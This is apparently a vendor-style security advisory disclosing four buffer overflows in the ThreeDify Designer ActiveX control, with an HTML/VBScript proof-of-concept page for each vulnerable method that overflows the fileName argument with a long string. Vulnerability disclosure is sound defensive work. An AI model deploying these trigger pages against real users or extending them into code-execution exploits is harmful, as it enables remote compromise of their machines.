Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered a multiple buffer overflow vulnerabilities in ThreeDify Designer ActiveX control.

1) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdExport()" method in ActiveSolid.dll file.
Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
The following PoC code is available:


<html>
<body>
<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
<script language='vbscript'>
arg1=String(3000, "A")
target.cmdExport arg1 
</script>
</body>
</html>


2) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdImport()" method in ActiveSolid.dll file.
Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
The following PoC code is available:


<html>
<body>
<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
<script language='vbscript'>
arg1=String(3000, "A")
target.cmdImport arg1 
</script>
</body>
</html>


3) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdOpen()" method in ActiveSolid.dll file.
Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
The following PoC code is available:


<html>
<body>
<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
<script language='vbscript'>
arg1=String(3000, "A")
target.cmdOpen arg1 
</script>
</body>
</html>


4) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdSave()" method in ActiveSolid.dll file.
Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
The following PoC code is available:


<html>
<body>
<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
<script language='vbscript'>
arg1=String(3000, "A")
target.cmdSave arg1 
</script>
